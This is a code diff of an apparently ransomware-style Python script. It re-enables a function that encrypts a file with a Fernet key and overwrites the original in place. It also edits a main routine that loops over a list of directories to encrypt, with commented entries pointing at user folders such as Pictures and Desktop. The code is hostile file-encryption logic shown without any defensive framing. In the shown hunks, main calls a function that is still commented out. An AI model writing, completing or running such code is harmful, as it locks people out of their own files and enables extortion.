@@ -3,7 +3,7 @@
 #from extract import extract_file
 
 
-'''def encrypt_file(filename: str, key: str):
+def encrypt_file(filename: str, key: str):
     """
     Encrypts a single file provided the path of the file and the Fernet key to encrypt it.
     :param filename: Represents the file to undergo encryption
@@ -19,7 +19,7 @@
     ciphertext = f_key.encrypt(plaintext)
     # Overwrites the same file
     with open(filename, "wb") as encrypted_file:
-        encrypted_file.write(ciphertext)'''
+        encrypted_file.write(ciphertext)
 
 
 '''def process_directory(directory: str, key: str, blacklist: list[str]):
@@ -85,6 +85,7 @@ def main():
         #os.path.expanduser("~/Pictures"),
         #os.path.expanduser("~/Desktop")
     ]
+
     for directory in directories_to_encrypt:
         process_directory(directory, key, blacklist)
 
